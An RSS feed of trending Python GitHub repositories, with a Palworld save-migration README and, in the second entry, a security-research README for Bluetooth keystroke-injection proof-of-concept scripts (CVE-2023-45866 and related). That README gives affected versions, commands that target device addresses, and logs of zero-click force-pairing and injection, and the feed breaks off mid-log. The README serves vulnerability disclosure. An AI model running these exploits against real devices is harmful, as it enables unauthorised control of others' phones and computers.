<?xml version="1.0" encoding="UTF-8"?><feed xmlns="http://www.w3.org/2005/Atom">
  <title>GitHub Python Daily Trending</title>
  <id>http://mshibanami.github.io/GitHubTrendingRSS</id>
  <updated>2024-01-25T01:39:30Z</updated>
  <subtitle>Daily Trending of Python in GitHub</subtitle>
  <link href="http://mshibanami.github.io/GitHubTrendingRSS"></link>
  <entry>
    <title>xNul/palworld-host-save-fix</title>
    <updated>2024-01-25T01:39:30Z</updated>
    <id>tag:github.com,2024-01-25:/xNul/palworld-host-save-fix</id>
    <link href="https://github.com/xNul/palworld-host-save-fix" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Fixes the bug which forces a player to create a new character when they already have a save. Useful for migrating maps from co-op to dedicated servers and from one dedicated server to another.&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Palworld Host Save Fix&lt;/h1&gt; &#xA;&lt;blockquote&gt; &#xA; &lt;h3&gt;&lt;span&gt;âš &lt;/span&gt; This tool is experimental. Be careful of data loss and &lt;em&gt;always&lt;/em&gt; make a backup.&lt;/h3&gt; &#xA;&lt;/blockquote&gt; &#xA;&lt;p&gt;Fixes the bug which forces a player to create a new character when they already have a save.&lt;/p&gt; &#xA;&lt;p&gt;Palworld save files are different depending on the type of server you are running. Co-op, Windows dedicated server, Linux dedicated server, SteamCMD dedicated server, all of these are different types of Palworld servers and if you try to migrate a save file from one type of server to another, you can run into a player save bug which forces you to create a new character.&lt;/p&gt; &#xA;&lt;p&gt;For example:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Moving a Windows co-op save to a Windows dedicated server will force the host to create a new character and lose their save.&lt;/li&gt; &#xA; &lt;li&gt;Moving a Windows dedicated server save to a Linux dedicated server will force all players to create a new character and lose their save.&lt;/li&gt; &#xA; &lt;li&gt;Moving a Linux dedicated server save to a Windows dedicated server will force all players to create a new character and lose their save.&lt;/li&gt; &#xA; &lt;li&gt;Moving a Windows co-op save to a Linux dedicated server will force all players to create a new character and lose their save.&lt;/li&gt; &#xA; &lt;li&gt;Etc.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;The bug happens because players are identified and correlated to their save via their GUID. These different types of servers generate player GUIDs differently so when a player joins, the server generates a new GUID that doesn&#39;t match the old save&#39;s GUID and because of this, doesn&#39;t realize the player already has a save.&lt;/p&gt; &#xA;&lt;p&gt;To fix this bug, we&#39;ve made a script that takes the GUID of the player on the new server and applies it to the player save from the old server so that the new server will use the player save from the old server.&lt;/p&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;p&gt;Dependencies:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Python 3&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/trumank/uesave-rs&#34;&gt;uesave-rs&lt;/a&gt;&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Command:&lt;br&gt; &lt;code&gt;python fix-host-save.py &amp;lt;uesave.exe&amp;gt; &amp;lt;save_path&amp;gt; &amp;lt;new_guid&amp;gt; &amp;lt;old_guid&amp;gt;&lt;/code&gt;&lt;br&gt; &lt;code&gt;&amp;lt;uesave.exe&amp;gt;&lt;/code&gt; - Path to your uesave.exe&lt;br&gt; &lt;code&gt;&amp;lt;save_path&amp;gt;&lt;/code&gt; - Path to your save folder&lt;br&gt; &lt;code&gt;&amp;lt;new_guid&amp;gt;&lt;/code&gt; - GUID of the player on the new server&lt;br&gt; &lt;code&gt;&amp;lt;old_guid&amp;gt;&lt;/code&gt; - GUID of the player from the old server&lt;/p&gt; &#xA;&lt;p&gt;Example:&lt;br&gt; &lt;code&gt;python fix-host-save.py &#34;C:\Users\John\.cargo\bin\uesave.exe&#34; &#34;C:\Users\John\Desktop\my_temporary_folder\2E85FD38BAA792EB1D4C09386F3A3CDA&#34; 6E80B1A6000000000000000000000000 00000000000000000000000000000001&lt;/code&gt;&lt;/p&gt; &#xA;&lt;h2&gt;How to migrate a co-op save to a Windows dedicated server&lt;/h2&gt; &#xA;&lt;p&gt;Prerequisites:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install the dependencies &lt;a href=&#34;https://raw.githubusercontent.com/xNul/palworld-host-save-fix/main/#usage&#34;&gt;above&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;The dedicated server is installed, running, and you&#39;re able to join it.&lt;/li&gt; &#xA; &lt;li&gt;If you have a Viewing Cage, follow the workaround &lt;a href=&#34;https://raw.githubusercontent.com/xNul/palworld-host-save-fix/main/#viewing-cage-bug&#34;&gt;below&lt;/a&gt; for the [Viewing Cage bug] in co-op before moving the save.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Steps:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Copy your desired save&#39;s folder from &lt;code&gt;C:\Users\&amp;lt;username&amp;gt;\AppData\Local\Pal\Saved\SaveGames\&amp;lt;random_numbers&amp;gt;&lt;/code&gt; to your dedicated server.&lt;/li&gt; &#xA; &lt;li&gt;In the &lt;code&gt;PalServer\Pal\Saved\Config\WindowsServer\GameUserSettings.ini&lt;/code&gt; file, change the &lt;code&gt;DedicatedServerName&lt;/code&gt; to match your save&#39;s folder name. For example, if your save&#39;s folder name is &lt;code&gt;2E85FD38BAA792EB1D4C09386F3A3CDA&lt;/code&gt;, the &lt;code&gt;DedicatedServerName&lt;/code&gt; changes to &lt;code&gt;DedicatedServerName=2E85FD38BAA792EB1D4C09386F3A3CDA&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Delete &lt;code&gt;PalServer\Pal\Saved\SaveGames\0\&amp;lt;your_save_here&amp;gt;\WorldOption.sav&lt;/code&gt; to allow modification of &lt;code&gt;PalWorldSettings.ini&lt;/code&gt;. Players will have to choose their respawn point again, but nothing else is affected as far as I can tell.&lt;/li&gt; &#xA; &lt;li&gt;Confirm you can connect to your save on the dedicated server and that the world is the one in the save. You can check the world with a character that belongs to a regular player from the co-op.&lt;/li&gt; &#xA; &lt;li&gt;Afterwards, the co-op host must create a new character on the dedicated server. A new &lt;code&gt;.sav&lt;/code&gt; file should appear in &lt;code&gt;PalServer\Pal\Saved\SaveGames\0\&amp;lt;your_save_here&amp;gt;\Players&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;The name of that new &lt;code&gt;.sav&lt;/code&gt; file is the co-op host&#39;s new GUID. We will need the co-op host&#39;s new GUID for the script to work.&lt;/li&gt; &#xA; &lt;li&gt;Shut the server down and then copy the entire dedicated server save at &lt;code&gt;PalServer\Pal\Saved\SaveGames\0\&amp;lt;your_save_here&amp;gt;&lt;/code&gt; (it must be the save with the co-op host&#39;s new character!) into a temporary folder and remember the path for the temporary folder because it&#39;s needed to run the script.&lt;/li&gt; &#xA; &lt;li&gt;If you have not already done so, install &lt;a href=&#34;https://github.com/trumank/uesave-rs&#34;&gt;uesave-rs&lt;/a&gt; and get the file path to its install location. If the path does not have &lt;code&gt;uesave.exe&lt;/code&gt; at the end, it&#39;s wrong.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Make a backup of your save!&lt;/strong&gt; This is an experimental script and has known bugs so always keep a backup copy of your save.&lt;/li&gt; &#xA; &lt;li&gt;Run the script using the command in the &lt;a href=&#34;https://raw.githubusercontent.com/xNul/palworld-host-save-fix/main/#usage&#34;&gt;Usage section&lt;/a&gt; with the information you&#39;ve gathered and using &lt;code&gt;00000000000000000000000000000001&lt;/code&gt; as the co-op host&#39;s old GUID.&lt;/li&gt; &#xA; &lt;li&gt;Copy the save from the temporary folder back to the dedicated server. Move the save you had in the dedicated server somewhere else or rename it to something different.&lt;/li&gt; &#xA; &lt;li&gt;Start the server back up and have the co-op host join the server with their fixed character.&lt;/li&gt; &#xA; &lt;li&gt;If, after 5 minutes of play, your Pals won&#39;t attack for you or do work in the base, follow the &lt;a href=&#34;https://raw.githubusercontent.com/xNul/palworld-host-save-fix/main/#pal-bug&#34;&gt;[Pal bug] workaround&lt;/a&gt; to fix them.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;How to migrate a Windows/Linux dedicated server save to a Linux/Windows dedicated server&lt;/h2&gt; &#xA;&lt;p&gt;Prerequisites:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Install the dependencies &lt;a href=&#34;https://raw.githubusercontent.com/xNul/palworld-host-save-fix/main/#usage&#34;&gt;above&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;The new dedicated server is installed, running, and you&#39;re able to join it.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;p&gt;Steps:&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Copy the save from your old dedicated server to your new dedicated server.&lt;/li&gt; &#xA; &lt;li&gt;In the &lt;code&gt;PalServer\Pal\Saved\Config\WindowsorLinuxServer\GameUserSettings.ini&lt;/code&gt; file of the new server, change the &lt;code&gt;DedicatedServerName&lt;/code&gt; to match your save&#39;s folder name. For example, if your save&#39;s folder name is &lt;code&gt;2E85FD38BAA792EB1D4C09386F3A3CDA&lt;/code&gt;, the &lt;code&gt;DedicatedServerName&lt;/code&gt; changes to &lt;code&gt;DedicatedServerName=2E85FD38BAA792EB1D4C09386F3A3CDA&lt;/code&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Start the new server and have every player create a new character. When a player creates a new character, a new &lt;code&gt;.sav&lt;/code&gt; file will appear in &lt;code&gt;PalServer\Pal\Saved\SaveGames\0\&amp;lt;your_save_here&amp;gt;\Players&lt;/code&gt;. The name of that new &lt;code&gt;.sav&lt;/code&gt; file is the player&#39;s new GUID. Make sure to keep track of all old GUIDs, new GUIDs, and which player they belong to.&lt;/li&gt; &#xA; &lt;li&gt;Shut the server down and then copy the entire new server save at &lt;code&gt;PalServer\Pal\Saved\SaveGames\0\&amp;lt;your_save_here&amp;gt;&lt;/code&gt; (it must be the save with all the new characters!) into a temporary folder and remember the path for the temporary folder because it&#39;s needed to run the script.&lt;/li&gt; &#xA; &lt;li&gt;If you have not already done so, install &lt;a href=&#34;https://github.com/trumank/uesave-rs&#34;&gt;uesave-rs&lt;/a&gt; and get the file path to its install location. If the path does not have &lt;code&gt;uesave.exe&lt;/code&gt; at the end, it&#39;s wrong.&lt;/li&gt; &#xA; &lt;li&gt;&lt;strong&gt;Make a backup of your save!&lt;/strong&gt; This is an experimental script and has known bugs so always keep a backup copy of your save.&lt;/li&gt; &#xA; &lt;li&gt;For each player&#39;s corresponding new GUID and old GUID pair, run the script using the command in the &lt;a href=&#34;https://raw.githubusercontent.com/xNul/palworld-host-save-fix/main/#usage&#34;&gt;Usage section&lt;/a&gt;.&lt;/li&gt; &#xA; &lt;li&gt;Copy the save from the temporary folder back to the dedicated server. Move the save you had in the dedicated server somewhere else or rename it to something different.&lt;/li&gt; &#xA; &lt;li&gt;Start the server back up and have each player join the server with their fixed character.&lt;/li&gt; &#xA; &lt;li&gt;If, after 5 minutes of play, a player&#39;s Pals won&#39;t attack for them or do work in their base, have them follow the &lt;a href=&#34;https://raw.githubusercontent.com/xNul/palworld-host-save-fix/main/#pal-bug&#34;&gt;[Pal bug] workaround&lt;/a&gt; to fix them.&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;How to migrate a Windows dedicated server save to co-op&lt;/h2&gt; &#xA;&lt;p&gt;&lt;a href=&#34;https://github.com/xNul/palworld-host-save-fix/issues/12#issuecomment-1904052304&#34;&gt;Apparently this is possible&lt;/a&gt; but I haven&#39;t tried it yet. Instructions should be very similar to &#34;How to migrate a co-op save to a Windows dedicated server&#34; but where you use the &lt;code&gt;00000000000000000000000000000001&lt;/code&gt; GUID as the new GUID and the player&#39;s current GUID on the dedicated server as the old GUID.&lt;/p&gt; &#xA;&lt;p&gt;If someone wants to make sure this kind of migration works and then create the instructions to do it, I&#39;d accept a PR for them.&lt;/p&gt; &#xA;&lt;h2&gt;Known bugs&lt;/h2&gt; &#xA;&lt;h3&gt;&lt;del&gt;[Guild bug]&lt;/del&gt;&lt;/h3&gt; &#xA;&lt;p&gt;&lt;strong&gt;** Has likely been fixed by &lt;a href=&#34;https://github.com/xNul/palworld-host-save-fix/pull/18&#34;&gt;https://github.com/xNul/palworld-host-save-fix/pull/18&lt;/a&gt;. **&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;del&gt;Details: Guild membership doesn&#39;t work properly after fixing a character. This is likely happening because there&#39;s some guild configuration being missed in the character migration from the old save to the new save.&lt;/del&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;del&gt;Workaround: [Co-op Only] In co-op, before moving the save, transfer ownership from the co-op host&#39;s character to another character and have the co-op host&#39;s character leave the guild. Fixes the issue entirely. Doesn&#39;t work when all players lose their save data because there is no working player to hold the guild.&lt;/del&gt;&lt;/p&gt; &#xA;&lt;h3&gt;[Pal bug]&lt;/h3&gt; &#xA;&lt;p&gt;Details: Pals owned by the player won&#39;t do anything at the base. This is likely caused by the Pals not being registered with the correct guild.&lt;/p&gt; &#xA;&lt;p&gt;Workaround: On the new server, after the save has been fixed, have each player&#39;s character go into their base, drop on the ground and pick up every single Pal they own, including the base workers. This can be done using the &#34;Drop&#34; button in the Party menu. This will re-register the Pals with the correct guild and fix the issue entirely.&lt;/p&gt; &#xA;&lt;h3&gt;[Viewing Cage bug]&lt;/h3&gt; &#xA;&lt;p&gt;Details: The Viewing Cage &lt;a href=&#34;https://tech.palworldgame.com/dedicated-server-guide#qa&#34;&gt;isn&#39;t officially supported&lt;/a&gt; on dedicated servers so if you have built one in co-op, it needs to be removed from your co-op save before migrating it to your dedicated server.&lt;/p&gt; &#xA;&lt;p&gt;Workaround: [Co-op Only] If you have built a Viewing Cage, it needs to be removed from your co-op save before migrating it to your dedicated server.&lt;/p&gt; &#xA;&lt;h3&gt;[Left Click bug]&lt;/h3&gt; &#xA;&lt;p&gt;Details: After applying the fix, some players experience a bug where you can&#39;t hold your left mouse button to attack. It seems like this only happens if you didn&#39;t do the &lt;a href=&#34;https://raw.githubusercontent.com/xNul/palworld-host-save-fix/main/#guild-bug&#34;&gt;[Guild bug] workaround&lt;/a&gt; but I&#39;m not sure.&lt;/p&gt; &#xA;&lt;p&gt;Workaround: If you leave the guild and rejoin, it goes away. Thanks &lt;a href=&#34;https://www.reddit.com/r/Palworld/comments/19axeqs/autoswing_not_working/kiq85zr/&#34;&gt;/u/skalibran&lt;/a&gt;!&lt;/p&gt; &#xA;&lt;h3&gt;Credit to &lt;a href=&#34;https://gist.github.com/cheahjs/300239464dd84fe6902893b6b9250fd0&#34;&gt;cheahjs&lt;/a&gt; for his very useful script helping me to make this fix!&lt;/h3&gt; &#xA;&lt;h3&gt;Appreciate any help testing and resolving bugs.&lt;/h3&gt;</summary>
  </entry>
  <entry>
    <title>marcnewlin/hi_my_name_is_keyboard</title>
    <updated>2024-01-25T01:39:30Z</updated>
    <id>tag:github.com,2024-01-25:/marcnewlin/hi_my_name_is_keyboard</id>
    <link href="https://github.com/marcnewlin/hi_my_name_is_keyboard" rel="alternate"></link>
    <summary type="html">&lt;p&gt;&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Hi, My Name is Keyboard&lt;/h1&gt; &#xA;&lt;p&gt;This repository contains proof-of-concept scripts for CVE-2023-45866, CVE-2024-21306, and CVE-2024-0230. Additional details can be found in the &lt;a href=&#34;https://github.com/skysafe/reblog/raw/main/cve-2024-0230/README.md&#34;&gt;blog post&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;table&gt; &#xA; &lt;thead&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;th&gt;Proof of Concept&lt;/th&gt; &#xA;   &lt;th&gt;Description&lt;/th&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/thead&gt; &#xA; &lt;tbody&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/marcnewlin/hi_my_name_is_keyboard/main/#android-keystroke-injection&#34;&gt;Android Keystroke Injection&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Force-pairs a virtual Bluetooth keyboard with a vulnerable Android device and injects 10 seconds of &lt;code&gt;tab&lt;/code&gt; keypresses.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/marcnewlin/hi_my_name_is_keyboard/main/#linux-keystroke-injection&#34;&gt;Linux Keystroke Injection&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Force-pairs a virtual Bluetooth keyboard with a Linux host and injects 10 seconds of &lt;code&gt;tab&lt;/code&gt; keypresses.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/marcnewlin/hi_my_name_is_keyboard/main/#macos-keystroke-injection&#34;&gt;macOS Keystroke Injection&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Force-pairs a virtual Bluetooth keyboard with a macOS host and injects keystrokes to open a web browser and perform a Google search.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/marcnewlin/hi_my_name_is_keyboard/main/#ios-keystroke-injection&#34;&gt;iOS Keystroke Injection&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Force-pairs a virtual Bluetooth keyboard with an iOS host and injects keystrokes to open a web browser and navigate to a URL.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/marcnewlin/hi_my_name_is_keyboard/main/windows-report.md&#34;&gt;Windows Keystroke Injection&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Force-pairs a virtual Bluetooth keyboard with a Windows host and injects &lt;code&gt;tab&lt;/code&gt; keypresses.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/marcnewlin/hi_my_name_is_keyboard/main/#magic-keyboard-link-key-via-lightning-port&#34;&gt;Magic Keyboard Link Key via Lightning Port&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Reads the Bluetooth link key from the Lightning port on a Magic Keyboard.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/marcnewlin/hi_my_name_is_keyboard/main/#magic-keyboard-link-key-via-bluetooth&#34;&gt;Magic Keyboard Link Key via Bluetooth&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Reads the Bluetooth link key from the unauthenticated Bluetooth HID service on the Magic Keyboard.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA;  &lt;tr&gt; &#xA;   &lt;td&gt;&lt;a href=&#34;https://raw.githubusercontent.com/marcnewlin/hi_my_name_is_keyboard/main/#magic-keyboard-link-key-via-usb-port-on-mac&#34;&gt;Magic Keyboard Link Key via USB Port on the Mac&lt;/a&gt;&lt;/td&gt; &#xA;   &lt;td&gt;Reads the Bluetooth link key for a target Magic Keyboard by spoofing the keyboard over USB to its paired Mac.&lt;/td&gt; &#xA;  &lt;/tr&gt; &#xA; &lt;/tbody&gt; &#xA;&lt;/table&gt; &#xA;&lt;h2&gt;Dependencies&lt;/h2&gt; &#xA;&lt;p&gt;The scripts are known to work on an Ubuntu 22.04 host with a Broadcom-based Bluetooth adapter.&lt;/p&gt; &#xA;&lt;p&gt;I primarily used this adapter: &lt;a href=&#34;https://www.amazon.com/Kinivo-USB-Bluetooth-4-0-Compatible/dp/B007Q45EF4&#34;&gt;https://www.amazon.com/Kinivo-USB-Bluetooth-4-0-Compatible/dp/B007Q45EF4&lt;/a&gt;&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;Bus 001 Device 026: ID 0a5c:21e8 Broadcom Corp. BCM20702A0 Bluetooth 4.0&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;Starting from a clean install of Ubuntu 22.04, the dependencies can be installed with the following commands.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;# update apt&#xA;sudo apt-get update&#xA;sudo apt-get -y upgrade&#xA;&#xA;# install dependencies from apt&#xA;sudo apt install -y bluez-tools bluez-hcidump libbluetooth-dev \&#xA;                    git gcc python3-pip python3-setuptools \&#xA;                    python3-pydbus&#xA;&#xA;# install pybluez from source&#xA;git clone https://github.com/pybluez/pybluez.git&#xA;cd pybluez&#xA;sudo python3 setup.py install&#xA;&#xA;# build bdaddr from the bluez source&#xA;cd ~/&#xA;git clone --depth=1 https://github.com/bluez/bluez.git&#xA;gcc -o bdaddr ~/bluez/tools/bdaddr.c ~/bluez/src/oui.c -I ~/bluez -lbluetooth&#xA;sudo cp bdaddr /usr/local/bin/&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Keystroke Injection&lt;/h2&gt; &#xA;&lt;h3&gt;Android Keystroke Injection&lt;/h3&gt; &#xA;&lt;p&gt;Android devices are vulnerable prior to the 2023-12-05 security patch level.&lt;/p&gt; &#xA;&lt;p&gt;When Bluetooth is enabled on an unpatched Android device, an attacker can pair an emulated Bluetooth keyboard and inject keystrokes, without user confirmation. This is a zero-click attack that works whenever Bluetooth is enabled.&lt;/p&gt; &#xA;&lt;h4&gt;Affected Versions&lt;/h4&gt; &#xA;&lt;p&gt;This vulnerability affects Android ~4.2.2 and later.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Android 4.2.2 - 10 will not be patched&lt;/li&gt; &#xA; &lt;li&gt;Android 11 - 14 have patches available (2023-12-05 security patch level)&lt;/li&gt; &#xA; &lt;li&gt;Pixel 6, 7 and 8 were patched&lt;/li&gt; &#xA; &lt;li&gt;Pixel 5 and older remain vulnerable&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Starting State&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Bluetooth is enabled on the target Android device&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Running the PoC&lt;/h4&gt; &#xA;&lt;p&gt;Run the PoC targeting Android device &lt;code&gt;5C:F3:70:AA:07:BD&lt;/code&gt; using interface &lt;code&gt;hci1&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./keystroke-injection-android-linux.py -i hci1 -t 5C:F3:70:AA:07:BD&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If successful, the PoC will inject a payload of &lt;code&gt;tab&lt;/code&gt; keystrokes for 10 seconds.&lt;/p&gt; &#xA;&lt;h4&gt;Example Output&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; ./keystroke-injection-android-linux.py -i hci1 -t 5C:F3:70:AA:07:BD&#xA;[2024-01-07 11:03:01.329]  executing &#39;sudo service bluetooth restart&#39;&#xA;[2024-01-07 11:03:01.959]  configuring Bluetooth adapter&#xA;[2024-01-07 11:03:01.963]  calling RegisterProfile&#xA;[2024-01-07 11:03:01.966]  running dbus loop&#xA;[2024-01-07 11:03:02.096]  executing &#39;sudo hciconfig hci1 name Hi, My Name is Keyboard&#39;&#xA;[2024-01-07 11:03:02.108]  executing &#39;hciconfig hci1 name&#39;&#xA;[2024-01-07 11:03:02.128]  executing &#39;sudo hciconfig hci1 class 0x002540&#39;&#xA;[2024-01-07 11:03:02.141]  executing &#39;hciconfig hci1 class&#39;&#xA;[2024-01-07 11:03:02.144]  executing &#39;hcitool name 5C:F3:70:AA:07:BD&#39;&#xA;[2024-01-07 11:03:02.877]  connecting to SDP&#xA;[2024-01-07 11:03:02.877]  connecting to 5C:F3:70:AA:07:BD on port 1&#xA;[2024-01-07 11:03:03.832]  SUCCESS! connected on port 1&#xA;[2024-01-07 11:03:03.832]  executing &#39;sudo btmgmt --index hci1 io-cap 1&#39;&#xA;[2024-01-07 11:03:03.847]  executing &#39;sudo btmgmt --index hci1 ssp 1&#39;&#xA;[2024-01-07 11:03:03.858]  connected to SDP (L2CAP 1) on target&#xA;[2024-01-07 11:03:03.865]  &#39;NoInputNoOutput&#39; pairing-agent is running&#xA;[2024-01-07 11:03:04.111]  connecting to 5C:F3:70:AA:07:BD on port 19&#xA;[2024-01-07 11:03:04.864]  ERROR connecting on port 19: [Errno 22] Invalid argument&#xA;[2024-01-07 11:03:04.864]  connecting to 5C:F3:70:AA:07:BD on port 17&#xA;[2024-01-07 11:03:04.932]  SUCCESS! connected on port 17&#xA;[2024-01-07 11:03:04.932]  connecting to HID Interrupt&#xA;[2024-01-07 11:03:04.932]  connecting to 5C:F3:70:AA:07:BD on port 19&#xA;[2024-01-07 11:03:05.008]  SUCCESS! connected on port 19&#xA;[2024-01-07 11:03:05.008]  connected to HID Interrupt (L2CAP 19) on target&#xA;[2024-01-07 11:03:05.008]  connected to HID Control (L2CAP 17) on target&#xA;[2024-01-07 11:03:05.009]  [RX-17] 9000&#xA;[2024-01-07 11:03:05.009]  [TX-17] 00&#xA;[2024-01-07 11:03:05.065]  [RX-19] a20101&#xA;[2024-01-07 11:03:05.259]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:03:05.259]  injecting Tab keypresses for 10 seconds&#xA;[2024-01-07 11:03:05.259]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:03:05.264]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:03:05.318]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:03:05.323]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:03:05.377]  [TX-19] a10100002b000000000000&#xA;[2024-01-07 11:03:05.382]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:03:05.436]  [TX-19] a10100002b000000000000&#xA;...&#xA;[2024-01-07 11:03:15.261]  [TX-19] a101000000000000000000&#xA;[2024-01-07 11:03:15.319]  payload has been transmitted; disconnecting Bluetooth HID client&#xA;[2024-01-07 11:03:15.321]  taking &#39;hci1&#39; offline&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h3&gt;Linux Keystroke Injection&lt;/h3&gt; &#xA;&lt;p&gt;Linux hosts running BlueZ 5 are vulnerable prior to patches rolling out in approximately December 2023. Specific version numbers depend on the Linux distribution.&lt;/p&gt; &#xA;&lt;p&gt;When an unpatched Linux host is discoverable and connectable over Bluetooth, an attacker can pair an emulated Bluetooth keyboard and inject keystrokes, without user confirmation. This is a zero-click attack that works whenever the host is discoverable and connectable.&lt;/p&gt; &#xA;&lt;h4&gt;Affected Versions&lt;/h4&gt; &#xA;&lt;p&gt;This vulnerability is understood to affect unpatched Linux distributions using the default configuration of BlueZ 5.&lt;/p&gt; &#xA;&lt;p&gt;Google states that ChromeOS was not affected by this vulnerability, and while ChromeOS was not tested as part of this research, their BlueZ configuration does appear to prevent the attack.&lt;/p&gt; &#xA;&lt;p&gt;Affected distributions include Ubuntu, Debian, Gentoo, Arch, Fedora, Red Hat, Yocto, and Amazon Linux. Multiple releases may be affected, and Ubuntu, for instance, patched 16.04, 18.04, 20.04, 22.04, 23.04 and 23.10.&lt;/p&gt; &#xA;&lt;h4&gt;Starting State&lt;/h4&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;The target Linux host is discoverable and connectable over Bluetooth.&lt;/li&gt; &#xA; &lt;li&gt;Linux hosts are commonly discoverable and connectable when the Bluetooth settings panel is open.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h4&gt;Running the PoC&lt;/h4&gt; &#xA;&lt;p&gt;Run the PoC targeting Linux host &lt;code&gt;58:28:39:E6:AE:1C&lt;/code&gt; using interface &lt;code&gt;hci1&lt;/code&gt;.&lt;/p&gt; &#xA;&lt;pre&gt;&lt;code&gt;./keystroke-injection-android-linux.py -i hci1 -t 58:28:39:E6:AE:1C&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;p&gt;If successful, the PoC will inject a payload of &lt;code&gt;tab&lt;/code&gt; keystrokes for 10 seconds.&lt;/p&gt; &#xA;&lt;h4&gt;Example Output&lt;/h4&gt; &#xA;&lt;pre&gt;&lt;code&gt;&amp;gt; ./keystroke-injection-android-linux.py -i hci1 -t 58:28:39:E6:AE:1C&#xA;[2024-01-07 11:00:08.955]  executing &#39;sudo service bluetooth restart&#39;&#xA;[2024-01-07 11:00:09.586]  configuring Bluetooth adapter&#xA;[2024-01-07 11:00:09.590]  calling RegisterProfile&#xA;[2024-01-07 11:00:09.595]  running dbus loop&#xA;[2024-01-07 11:00:09.725]  executing &#39;sudo hciconfig hci1 name Hi, My Name is Keyboard&#39;&#xA;[2024-01-07 11:00:09.738]  executing &#39;hciconfig hci1 name&#39;&#xA;[2024-01-07 11:00:09.759]  executing &#39;sudo hciconfig hci1 class 0x002540&#39;&#xA;[2024-01-07 11:00:09.771]  executing &#39;hciconfig hci1 class&#39;&#xA;[2024-01-07 11:00:09.774]  executing &#39;hcitool name 58:28:39:E6:AE:1C&#39;&#xA;[2024-01-07 11:00:10.399]  connecting to SDP&#xA;[2024-01-07 11:00:10.400]  connecting to 58:28:39:E6:AE:1C on port 1&#xA;[2024-01-07 11:00:12.984]  SUCCESS! connected on port 1&#xA;[2024-01-07 11:00:12.984]  executing &#39;sudo btmgmt --index hci1 io-cap 1&#39;&#xA;[2024-01-07 11:00:12.992]  executing &#39;sudo btmgmt --index hci1 ssp 